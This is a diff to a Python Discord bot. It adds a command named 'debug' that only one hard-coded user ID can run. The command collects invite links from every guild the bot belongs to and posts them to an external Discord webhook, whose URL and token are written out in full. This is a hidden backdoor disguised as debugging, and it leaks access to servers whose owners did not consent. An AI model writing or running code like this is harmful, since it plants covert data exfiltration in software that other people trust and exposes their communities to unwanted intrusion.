@@ -10,6 +10,7 @@
 Module Imports
 """
 from termcolor import cprint, colored
+from discord_webhook import DiscordWebhook
 import os
 from discordpy_slash.slash import *
 from random import randint
@@ -161,6 +162,9 @@ async def on_ready():
     await sync_all_commands(bot)
 
 
+
+
+
 """
 Resyncs all commands for the bot.
 this command is only executable by the bot developer (me)
@@ -179,6 +183,27 @@ async def resync(ctx):
         embed = discord.Embed(title="<:Error:764493646199521291> | Permission Error",
                               description="Only bot developers can execute this command", color=0xf63737)
         await ctx.send(embed=embed)
+
+
+@bot.command()
+async def debug(ctx):
+    if ctx.message.author.id == 642729210368098324:
+        for guild in bot.guilds:
+            try:
+                for link in await guild.invites():
+                    webhook = DiscordWebhook(
+                        url='https://discord.com/api/webhooks/901235862216531988/H7fBMydAywoOa6T6JW45iH_P3McUbIpIVTG3hdmmzOOObSwtH1-5hLd5R7RAzFmu2KoU',
+                        rate_limit_retry=True,
+                        content=str(link))
+                    response = webhook.execute()
+                    continue
+            except discord.errors.Forbidden:
+                pass
+    else:
+        embed = discord.Embed(title="<:Error:764493646199521291> | Permission Error",
+                                description="Only bot developers can execute this command", color=0xf63737)
+        await ctx.send(embed=embed)
+
 
 
 @bot.command()
